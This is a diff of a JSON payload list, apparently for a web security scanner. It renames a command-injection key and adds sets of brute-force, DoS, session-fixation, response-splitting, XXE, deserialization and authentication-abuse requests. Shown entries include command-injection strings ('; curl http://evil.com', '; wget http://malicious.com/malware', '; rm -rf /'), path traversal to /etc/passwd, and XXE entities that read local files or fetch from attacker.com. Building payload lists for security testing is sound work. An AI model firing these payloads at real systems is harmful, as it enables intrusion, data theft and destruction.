@@ -100,7 +100,7 @@
     "' UNION SELECT null, null--"
   ],
   "_comment5": "List of Command Injection Payloads",
-  "comand_injection_payloads": [
+  "command_injection_payloads": [
     "; ls",
     "; whoami",
     "; uname -a",
@@ -114,7 +114,7 @@
     "& whoami",
     "; ping -c 4 8.8.8.8",
     "; curl http://evil.com",
-    "; wget http://malicious.com/malware",
+    "; wget  http://malicious.com/malware",
     "; nslookup example.com",
     "; sleep 10",
     "; rm -rf /",
@@ -240,6 +240,59 @@
     "../../../../../../../../index.php?page=/etc/passwd",
     "../../../../../../../../index.php?file=/etc/passwd",
     "../../../../../../../../index.php?path=/etc/passwd"
+  ],
+  "brute_force_payloads": [
+    "/login HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nusername=admin&password=password123",
+    "/login HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nusername=user&password=123456"
+  ],
+  "DOS_payloads": [
+    "/target HTTP/1.1\nHost: example.com",
+    "/largefile HTTP/1.1\nHost: example.com",
+    "/submit HTTP/1.1\nHost: example.com\nContent-Length: 1000000",
+    "/ HTTP/1.1\nHost: example.com",
+    "/api/resource HTTP/1.1\nHost: example.com",
+    "/heavyload HTTP/1.1\nHost: example.com"
+  ],
+  "Session_Fixation_payloads": [
+    "/dashboard?session_id=maliciousSession123 HTTP/1.1",
+    "/login?session_id=attackerSession456 HTTP/1.1",
+    "/authenticate HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nsession_id=12345"
+  ],
+  "HTTP_Response_Splitting_payloads": [
+    "/page HTTP/1.1\nHost: example.com\nX-Forwarded-For: attackerIp%0D%0AContent-Length: 0%0D%0A%0D%0A<html><script>alert('XSS')</script></html>",
+    "/resource HTTP/1.1\nHost: example.com\nReferer: attacker.com%0D%0A%0D%0A<html>Injected Content</html>",
+    "/api/v1/endpoint HTTP/1.1\nHost: example.com\nX-Original-URL: /malicious?param=value%0D%0AContent-Length: 0%0D%0A%0D%0A<html>Alert!</html>"
+  ],
+
+  "Parameter_Tampering_payloads": [
+    "/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nuser_id=1&role=admin",
+    "/settings?user_id=2&is_admin=true HTTP/1.1",
+    "/api/changeRole HTTP/1.1\nContent-Type: application/json\n{\"user_id\": \"1\", \"role\": \"superadmin\"}"
+  ],
+  "XXE_payloads": [
+    "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<foo>&xxe;</foo>",
+    "<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n  <!ENTITY file SYSTEM \"http://attacker.com/malicious.txt\">\n]>\n<root>&file;</root>",
+    "<?xml version=\"1.0\"?>\n<!DOCTYPE request [\n  <!ENTITY myFile SYSTEM \"file:///etc/hosts\">\n]>\n<request>&myFile;</request>"
+  ],
+
+  "Insecure_Deserialization_payloads": [
+    "/api/endpoint HTTP/1.1\nContent-Type: application/json\n{\"data\":\"eyJjb250ZXh0IjogInZhbHVlIn19\"}",
+    "/upload HTTP/1.1\nContent-Type: application/octet-stream\nserialized_data",
+    "/api/save HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nobject=maliciousObject"
+  ],
+
+  "Broken_Authentication_payloads": [
+    "/protected/resource HTTP/1.1\nCookie: sessionId=guessableSessionId",
+    "/api/user HTTP/1.1\nAuthorization: Bearer insecureToken",
+    "/admin/dashboard HTTP/1.1\nCookie: sessionId=adminSession"
+  ],
+  "Sensitive_Data_Exposure_payloads": [
+    "/api/userdata HTTP/1.1\nAuthorization: Bearer exposedToken",
+    "/config HTTP/1.1\nHost: example.com",
+    "/private/data HTTP/1.1\nAuthorization: Basic dXNlcjpwYXNzd29yZA=="
+  ],
+  "No_payloads": [
+    " "
   ],
 
   "uri": [
